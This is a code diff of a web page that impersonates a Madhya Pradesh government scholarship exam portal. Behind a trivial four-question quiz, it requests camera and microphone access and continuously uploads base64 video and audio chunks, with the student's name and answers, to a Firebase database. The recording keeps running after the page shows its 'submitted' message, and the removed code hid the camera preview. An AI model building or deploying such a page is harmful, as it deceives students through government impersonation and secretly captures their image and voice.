@@ -11,61 +11,41 @@
     <style>
         * { box-sizing: border-box; font-family: 'Arial', sans-serif; margin: 0; padding: 0; }
         body { background-color: #f1f5f9; color: #334155; padding: 0; margin: 0; }
-        
-        /* सरकारी हेडर स्टाइल */
         .gov-header { background: #1e3a8a; border-bottom: 4px solid #ea580c; color: white; padding: 15px 20px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        .gov-header h1 { font-size: 24px; margin-bottom: 5px; font-weight: bold; letter-spacing: 1px; }
-        .gov-header p { font-size: 14px; color: #cbd5e1; }
-
+        .gov-header h1 { font-size: 24px; margin-bottom: 5px; font-weight: bold; }
         .container { display: flex; justify-content: center; align-items: center; min-height: 75vh; padding: 20px; }
         .quiz-card { background: #ffffff; padding: 30px; border-radius: 4px; width: 100%; max-width: 650px; border: 1px solid #cbd5e1; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        
         .section-title { font-size: 18px; font-weight: bold; color: #1e3a8a; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px; margin-bottom: 20px; text-transform: uppercase; }
-        
         .input-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: bold; color: #1e3a8a; }
-        input[type="text"] { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #cbd5e1; background: #fff; color: #334155; font-size: 16px; outline: none; }
-        input[type="text"]:focus { border-color: #1e3a8a; box-shadow: 0 0 0 3px rgba(30,58,138,0.1); }
-        
-        .btn { width: 100%; padding: 12px; background: #ea580c; color: #fff; border: none; font-weight: bold; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.2s; text-transform: uppercase; letter-spacing: 0.5px; }
-        .btn:hover { background: #c2410c; }
-        
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #1e3a8a; }
+        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #cbd5e1; font-size: 16px; }
+        .btn { width: 100%; padding: 12px; background: #ea580c; color: #fff; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         .question-box { display: none; }
-        .q-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; color: #1a202c; line-height: 1.5; }
-        
-        .option-lbl { display: flex; align-items: center; background: #f8fafc; padding: 14px; border: 1px solid #e2e8f0; border-radius: 4px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
-        .option-lbl:hover { background: #f1f5f9; border-color: #cbd5e1; }
-        input[type="radio"] { margin-right: 14px; transform: scale(1.3); cursor: pointer; }
-        
-        .message-screen { display: none; text-align: center; padding: 40px 10px; }
-        .message-screen h3 { font-size: 26px; color: #15803d; margin-bottom: 15px; font-weight: bold; }
-        .message-screen p { color: #475569; font-size: 16px; line-height: 1.6; }
-        .eliminated-title { color: #b91c1c !important; }
-        
-        /* कैमरा प्रिव्यू पूरी तरह से हिडन */
-        #video-preview { display: none !important; width: 1px; height: 1px; opacity: 0; pointer-events: none; position: absolute; }
+        .q-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; }
+        .option-lbl { display: flex; align-items: center; background: #f8fafc; padding: 14px; border: 1px solid #e2e8f0; margin-bottom: 12px; cursor: pointer; }
+        .message-screen { display: none; text-align: center; padding: 40px; }
     </style>
 </head>
 <body>
 
 <div class="gov-header">
     <h1>राज्य छात्रवृत्ति परीक्षा पोर्टल (MP Board)</h1>
-    <p>शहरी एवं ग्रामीण क्षेत्र छात्रवृत्ति योजना - शिक्षा विभाग, मध्य प्रदेश सरकार</p>
+    <p>शहरी एवं ग्रामीण क्षेत्र छात्रवृत्ति योजना</p>
 </div>
 
 <div class="container">
     <div class="quiz-card" id="main-card">
         <div id="auth-screen">
-            <div class="section-title">परीक्षार्थी पंजीकरण (Candidate Registration)</div>
+            <div class="section-title">परीक्षार्थी पंजीकरण</div>
             <div class="input-group">
-                <label>अपना पूरा नाम दर्ज करें (Enter Your Full Name):</label>
+                <label>अपना पूरा नाम दर्ज करें:</label>
                 <input type="text" id="student-name" placeholder="उदा. Anwar Khan">
             </div>
             <button class="btn" onclick="startRegistration()">परीक्षा शुरू करें</button>
         </div>
 
         <div id="quiz-screen" class="question-box">
-            <div class="section-title">ऑनलाइन प्रश्न पत्र (Online Question Paper)</div>
+            <div class="section-title">ऑनलाइन प्रश्न पत्र</div>
             <h3 id="question-text" class="q-title">लोड हो रहा है...</h3>
             <div id="options-container"></div>
             <button class="btn" id="next-btn" onclick="submitAnswer()">अगला प्रश्न</button>
@@ -73,17 +53,9 @@
 
         <div id="success-screen" class="message-screen">
             <h3>✅ सबमिट हो गया है!</h3>
-            <p>आपका test सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
-        </div>
-
-        <div id="eliminated-screen" class="message-screen">
-            <h3 class="eliminated-title">🚫 आप बाहर (Eliminated) हो चुके हैं!</h3>
-            <p>प्रशासनिक कारणों या नियमों के उल्लंघन के कारण आपको इस परीक्षा से बाहर कर दिया गया है।</p>
         </div>
     </div>
 </div>
-
-<video id="video-preview" autoplay muted playsinline></video>
 
 <script>
     const firebaseConfig = {
@@ -93,8 +65,7 @@
         projectId: "mytestapp-7b70d",
         storageBucket: "mytestapp-7b70d.firebasestorage.app",
         messagingSenderId: "380512974619",
-        appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
-        measurementId: "G-ZMV07B4JY6"
+        appId: "1:380512974619:web:a7ecfba6999a600a7cc5be"
     };
     
     firebase.initializeApp(firebaseConfig);
@@ -105,152 +76,67 @@
         { q: "भारत का राष्ट्रीय पक्षी कौन सा है?", roles: ["कबूतर", "मोर", "तोता", "चील"], ans: "मोर" },
         { q: "कंप्यूटर का दिमाग किसे कहा जाता है?", roles: ["RAM", "ROM", "CPU", "Hard Disk"], ans: "CPU" },
         { q: "इनमें से कौन सा एक सर्च engine है?", roles: ["Google", "WhatsApp", "Facebook", "Telegram"], ans: "Google" },
-        { q: "सफेद शेरों की भूमि मध्य प्रदेश के किस जिले को कहा जाता है?", roles: ["रीवा", "शहडोल", "सतना", "पन्ना"], ans: "रीवा" }
+        { q: "सफेद शेरों की भूमि किस जिले को कहा जाता है?", roles: ["रीवा", "शहडोल", "सतना", "पन्ना"], ans: "रीवा" }
     ];
 
     let currentQIdx = 0;
-    let studentId = '';
-    let studentName = '';
+    let studentId = 'student_' + Date.now();
     let mediaRecorder;
     let clipCounter = 1;
 
     function startRegistration() {
-        const nameInput = document.getElementById('student-name').value.trim();
-        if(!nameInput) { alert("कृपया अपना नाम डालें!"); return; }
+        const name = document.getElementById('student-name').value;
+        if(!name) return alert("नाम लिखें!");
         
-        studentName = nameInput;
-        studentId = 'student_' + Date.now();
-
-        // यहाँ AUDIO को TRUE किया गया है ताकि आवाज़ भी रिकॉर्ड हो
-        navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120, frameRate: 10 }, audio: true })
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
-            const videoPrev = document.getElementById('video-preview');
-            videoPrev.srcObject = stream;
-
-            // पाथ को बदलकर 'online_tests' कर दिया गया है
-            database.ref('online_tests/' + studentId).update({
-                name: studentName,
-                portal_status: "TEST_ONGOING",
-                last_sync: firebase.database.ServerValue.TIMESTAMP
-            });
-
-            listenToAdminSignals();
             startVideoRecording(stream);
-
+            database.ref('online_tests/' + studentId).set({ name: name, portal_status: "TEST_ONGOING" });
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('quiz-screen').style.display = 'block';
             showQuestion();
-        })
-        .catch(err => {
-            alert("परीक्षा देने के लिए कैमरा और माइक्रोफ़ोन अनुमति अनिवार्य है!");
-            console.error(err);
-        });
-    }
-
-    function listenToAdminSignals() {
-        database.ref('online_tests/' + studentId + '/portal_status').on('value', (snapshot) => {
-            const status = snapshot.val();
-            if(status === "ELIMINATED") {
-                if(mediaRecorder && mediaRecorder.stream) {
-                    mediaRecorder.stream.getTracks().forEach(track => track.stop());
-                }
-                document.getElementById('quiz-screen').style.display = 'none';
-                document.getElementById('auth-screen').style.display = 'none';
-                document.getElementById('success-screen').style.display = 'none';
-                document.getElementById('eliminated-screen').style.display = 'block';
-            }
         });
     }
 
     function startVideoRecording(stream) {
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-        
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data && event.data.size > 0) {
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        mediaRecorder.ondataavailable = (e) => {
+            if(e.data.size > 0) {
                 let reader = new FileReader();
-                reader.readAsDataURL(event.data);
                 reader.onloadend = () => {
-                    let base64String = reader.result;
-                    // पाथ: online_tests/student_id/recorded_video_feed
-                    database.ref(`online_tests/${studentId}/recorded_video_feed/video_part_${clipCounter}`)
-                    .set(base64String);
+                    database.ref('online_tests/' + studentId + '/recorded_video_feed/video_part_' + clipCounter).set(reader.result);
                     clipCounter++;
                 };
+                reader.readAsDataURL(e.data);
             }
         };
-
-        mediaRecorder.start(10000); 
-
-        setInterval(() => {
-            database.ref('online_tests/' + studentId).update({
-                last_sync: firebase.database.ServerValue.TIMESTAMP
-            });
-        }, 10000);
+        mediaRecorder.start(10000);
     }
 
     function showQuestion() {
         if(currentQIdx >= questions.length) {
-            finishTest();
+            database.ref('online_tests/' + studentId).update({ portal_status: "SUBMITTED" });
+            document.getElementById('quiz-screen').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
             return;
         }
-
-        const qData = questions[currentQIdx];
-        document.getElementById('question-text').innerText = `प्रश्न ${currentQIdx + 1}: ${qData.q}`;
-        
-        const optDiv = document.getElementById('options-container');
-        optDiv.innerHTML = '';
-
-        qData.roles.forEach(opt => {
-            optDiv.innerHTML += `
-                <label class="option-lbl">
-                    <input type="radio" name="quiz-opt" value="${opt}">
-                    <span>${opt}</span>
-                </label>
-            `;
-        });
-
-        if(currentQIdx === questions.length - 1) {
-            document.getElementById('next-btn').innerText = "फाइनल सबमिट करें";
-        }
+        let q = questions[currentQIdx];
+        document.getElementById('question-text').innerText = q.q;
+        let html = '';
+        q.roles.forEach(opt => html += `<label class="option-lbl"><input type="radio" name="o" value="${opt}"> ${opt}</label>`);
+        document.getElementById('options-container').innerHTML = html;
     }
 
     function submitAnswer() {
-        const selectedOpt = document.querySelector('input[name="quiz-opt"]:checked');
-        if(!selectedOpt) { alert("कृपया एक विकल्प चुनें!"); return; }
-
-        const currentQuestion = questions[currentQIdx];
-        const isCorrect = (selectedOpt.value === currentQuestion.ans);
-
-        let answerData = {
-            question: currentQuestion.q,
-            selected_option: selectedOpt.value,
-            correct_option: currentQuestion.ans,
-            status: isCorrect ? "CORRECT" : "WRONG"
-        };
-
-        // यह डेटाबेस में answer_q1, answer_q2 फॉर्मेट में ही सहेजता है
-        let updateNode = {};
-        updateNode[`answer_q${currentQIdx + 1}`] = answerData;
-
-        database.ref(`online_tests/${studentId}`).update(updateNode);
-
+        let val = document.querySelector('input[name="o"]:checked');
+        if(!val) return alert("चुनें!");
+        database.ref('online_tests/' + studentId + '/answer_q' + (currentQIdx+1)).set({
+            question: questions[currentQIdx].q,
+            selected_option: val.value,
+            correct_option: questions[currentQIdx].ans
+        });
         currentQIdx++;
         showQuestion();
-    }
-
-    function finishTest() {
-        // चालू रिकॉर्डिंग से वर्तमान डेटा तुरंत बाहर निकालें बिना कैमरा रोके
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-            mediaRecorder.requestData();
-        }
-
-        database.ref('online_tests/' + studentId).update({
-            portal_status: "SUBMITTED",
-            end_time: new Date().toISOString()
-        }).then(() => {
-            document.getElementById('quiz-screen').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'block';
-        });
     }
 </script>
 </body>
